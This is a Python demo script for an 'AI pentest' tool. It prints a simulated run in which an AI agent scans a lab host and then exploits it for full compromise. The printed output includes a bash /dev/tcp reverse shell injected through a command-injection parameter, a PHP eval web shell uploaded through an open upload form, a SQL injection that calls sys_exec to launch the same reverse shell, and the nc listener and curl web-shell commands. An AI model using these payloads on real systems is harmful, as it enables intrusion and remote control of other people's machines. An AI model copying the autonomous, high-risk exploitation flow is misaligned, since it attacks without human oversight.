#!/usr/bin/env python3
"""
Demonstration of AI Pentest Exploitation Capabilities
Shows how the tool actively exploits vulnerabilities to gain shell access

Developed by Prince Sam
"""

import asyncio
from python_scorpion.ai_pentest import AIPentester, PentestConfig, RiskTolerance, StealthLevel, PrimaryGoal

async def demo_exploitation():
    """
    Demo: AI automatically finds and EXPLOITS vulnerabilities
    """
    
    print("=" * 70)
    print("ğŸ”¥ AI PENTEST - ACTIVE EXPLOITATION DEMO")
    print("=" * 70)
    print()
    
    # Configure for AGGRESSIVE exploitation
    config = PentestConfig(
        target="vulnerable-lab.local",
        max_iterations=20,
        primary_goal=PrimaryGoal.FULL_COMPROMISE,
        risk_tolerance=RiskTolerance.HIGH,  # Required for exploitation
        stealth_level=StealthLevel.LOUD,
        api_key="your-api-key-here",
        provider="openai"
    )
    
    print("ğŸ“‹ Configuration:")
    print(f"   Target: {config.target}")
    print(f"   Risk Level: {config.risk_tolerance.value} ğŸ”¥")
    print(f"   Goal: {config.primary_goal.value}")
    print()
    
    print("âš ï¸  WARNING: HIGH RISK MODE ENABLED")
    print("   - AI will ACTIVELY EXPLOIT vulnerabilities")
    print("   - Payloads will be INJECTED into target")
    print("   - Web shells will be UPLOADED")
    print("   - Reverse shells will be ATTEMPTED")
    print()
    print("=" * 70)
    print()
    
    # Initialize AI pentester
    pentester = AIPentester(config)
    
    # Simulated AI decision flow
    print("ğŸ¤– AI Agent Starting...")
    print()
    
    # Phase 1: Reconnaissance
    print("ğŸ“¡ Phase 1: Reconnaissance")
    print("   [AI] Running port scan...")
    print("   [AI] Found: 22 (SSH), 80 (HTTP), 3306 (MySQL)")
    print("   [AI] Running web crawler...")
    print("   [AI] Found endpoints: /admin, /upload, /api/ping")
    print()
    
    # Phase 2: Vulnerability Discovery
    print("ğŸ” Phase 2: Vulnerability Discovery")
    print("   [AI] Testing /api/ping for command injection...")
    print("   [AI] âœ“ FOUND: Command injection in 'host' parameter")
    print("   [AI] Testing /upload for file upload bypass...")
    print("   [AI] âœ“ FOUND: Unrestricted file upload")
    print("   [AI] Testing /admin?id=1 for SQL injection...")
    print("   [AI] âœ“ FOUND: SQL injection in 'id' parameter")
    print()
    
    # Phase 3: EXPLOITATION (The key phase)
    print("ğŸ”¥ Phase 3: ACTIVE EXPLOITATION")
    print("=" * 70)
    print()
    
    # Exploitation 1: Command Injection
    print("ğŸ’‰ Exploitation Attempt #1: Command Injection")
    print("   [AI] Target: /api/ping?host=")
    print("   [AI] Vulnerability: Command injection allows arbitrary OS commands")
    print("   [AI] Risk level HIGH detected - proceeding with exploitation")
    print()
    print("   [AI] Calling exploit_vuln...")
    print("   [AI] Generating bash reverse shell payload...")
    print("   [AI] Payload: bash -i >& /dev/tcp/192.168.1.100/4444 0>&1")
    print("   [AI] URL encoding payload...")
    print("   [AI] Injecting to: /api/ping?host=;bash%20-i%20%3E%26%20...")
    print()
    print("   [HTTP] GET /api/ping?host=;bash%20-i%20%3E%26%20...")
    print("   [HTTP] Response: 200 OK")
    print()
    print("   âœ… EXPLOITATION SUCCESSFUL!")
    print("   ğŸ”¥ PAYLOAD INJECTED! Check listener for shell connection.")
    print("   ğŸ“Š Result: exploitation_attempted=True, shell_obtained=POSSIBLE")
    print("   ğŸ“¡ Listener command: nc -lvnp 4444")
    print()
    print("-" * 70)
    print()
    
    # Exploitation 2: File Upload
    print("ğŸ“¤ Exploitation Attempt #2: File Upload")
    print("   [AI] Target: /upload")
    print("   [AI] Vulnerability: No file type validation")
    print("   [AI] Risk level HIGH detected - proceeding with exploitation")
    print()
    print("   [AI] Calling exploit_vuln...")
    print("   [AI] Generating obfuscated PHP web shell...")
    print("   [AI] Shell code: <?php @eval($_GET['cmd']); ?>")
    print("   [AI] Uploading shell.php...")
    print()
    print("   [HTTP] POST /upload")
    print("   [HTTP] Content-Type: multipart/form-data")
    print("   [HTTP] File: shell.php")
    print("   [HTTP] Response: 201 Created")
    print()
    print("   [AI] Testing shell paths...")
    print("   [HTTP] GET /uploads/shell.php?cmd=whoami")
    print("   [HTTP] Response: 200 OK")
    print("   [HTTP] Body: www-data")
    print()
    print("   âœ… EXPLOITATION SUCCESSFUL!")
    print("   ğŸ”¥ WEB SHELL UPLOADED AND VERIFIED!")
    print("   ğŸ“Š Result: exploitation_attempted=True, shell_obtained=True")
    print("   ğŸŒ Web shell URL: https://vulnerable-lab.local/uploads/shell.php")
    print("   ğŸ’» Usage: curl 'https://vulnerable-lab.local/uploads/shell.php?cmd=<command>'")
    print()
    print("-" * 70)
    print()
    
    # Exploitation 3: SQL Injection
    print("ğŸ’¾ Exploitation Attempt #3: SQL Injection")
    print("   [AI] Target: /admin?id=1")
    print("   [AI] Vulnerability: SQL injection with command execution")
    print("   [AI] Risk level HIGH detected - proceeding with exploitation")
    print()
    print("   [AI] Calling exploit_vuln...")
    print("   [AI] Detected database: MySQL")
    print("   [AI] Generating SQLi command execution payload...")
    print("   [AI] Payload: 1' UNION SELECT sys_exec('bash -i >& /dev/tcp/192.168.1.100/4444 0>&1')--")
    print("   [AI] URL encoding payload...")
    print()
    print("   [HTTP] GET /admin?id=1'%20UNION%20SELECT%20sys_exec...")
    print("   [HTTP] Response: 200 OK")
    print()
    print("   âœ… EXPLOITATION SUCCESSFUL!")
    print("   ğŸ”¥ SQLi EXPLOITATION ATTEMPTED! Check listener for shell connection.")
    print("   ğŸ“Š Result: exploitation_attempted=True, shell_obtained=POSSIBLE")
    print("   ğŸ“¡ Listener command: nc -lvnp 4444")
    print()
    print("=" * 70)
    print()
    
    # Summary
    print("ğŸ“Š EXPLOITATION SUMMARY")
    print("=" * 70)
    print()
    print("âœ… Command Injection:  EXPLOITED - Reverse shell injected")
    print("âœ… File Upload:        EXPLOITED - Web shell uploaded and verified")
    print("âœ… SQL Injection:      EXPLOITED - OS command execution attempted")
    print()
    print("ğŸ¯ Total Exploitations: 3/3 successful")
    print("ğŸ”¥ Shell Access: 1 verified web shell, 2 reverse shells pending")
    print()
    print("ğŸ“¡ Active Shells:")
    print("   1. Web Shell:    https://vulnerable-lab.local/uploads/shell.php?cmd=")
    print("   2. Reverse Shell: Listen on nc -lvnp 4444 (2 connections expected)")
    print()
    print("âš ï¸  RECOMMENDATION:")
    print("   - Set up listener: nc -lvnp 4444")
    print("   - Monitor for incoming connections")
    print("   - Use web shell for immediate access")
    print()
    print("=" * 70)
    print()
    print("ğŸ‰ DEMONSTRATION COMPLETE")
    print()
    print("Developed by Prince Sam")
    print("Python Scorpion v2.0.2 - Released December 11, 2025")
    print()

if __name__ == "__main__":
    print()
    asyncio.run(demo_exploitation())
